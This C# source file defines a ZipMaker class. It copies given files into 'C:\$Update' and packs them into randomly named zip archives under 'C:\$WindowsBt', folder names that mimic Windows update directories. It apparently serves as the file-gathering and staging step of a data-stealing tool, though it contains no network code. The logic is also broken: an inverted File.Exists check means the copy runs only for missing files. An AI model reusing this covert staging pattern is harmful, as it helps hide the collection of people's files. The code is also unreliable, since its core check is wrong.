﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO.Compression;
using System.IO;

namespace systemU
{
    public class ZipMaker
    {

        public void makeZip(List<FileIO> f)
        {
            List<string> paths = new List<string>();
            Random r = new Random();
            long totalSize = 0;
            f.ForEach(i =>
                    {
                    
               totalSize += i.Size;
               string savePath = string.Empty;
               if (!Directory.Exists("C:\\$Update"))
                   Directory.CreateDirectory("C:\\$Update");
               if (!File.Exists(i.Path))
               {
                   savePath = $"C:\\$Update\\{i.Path.Split('\\')[i.Path.Split('\\').Length - 1]}";
                   File.Copy(i.Path, savePath);
               }
               else
               {
                   savePath = $"C:\\$Update\\{r.Next(2000)} {r.Next(2000)} {i.Path.Split('\\')[i.Path.Split('\\').Length - 1]}";
                   File.Copy(i.Path, savePath);
               }
               paths.Add(savePath);
               if (totalSize > 1024)
               {
                   if (!Directory.Exists("C:\\$WindowsBt"))
                       Directory.CreateDirectory("C:\\$WindowsBt");
                   ZipFile.CreateFromDirectory("C:\\$Update", $"C:\\$WindowsBt\\{r.Next(2000)} {r.Next(2000)} {r.Next(2000)}.zip", CompressionLevel.Optimal, false);
                   totalSize = 0;
                   paths.ForEach(p => { File.Delete(p); });
                   paths = new List<string>();
               }
           });
            if (!Directory.Exists("C:\\$WindowsBt"))
                Directory.CreateDirectory("C:\\$WindowsBt");
            ZipFile.CreateFromDirectory("C:\\$Update", $"C:\\$WindowsBt\\{r.Next(2000)} {r.Next(2000)} {r.Next(2000)}.zip", CompressionLevel.Optimal, false);
            Array.ForEach(Directory.GetFiles("C:\\$Update\\"), File.Delete);
        }
      
    }
}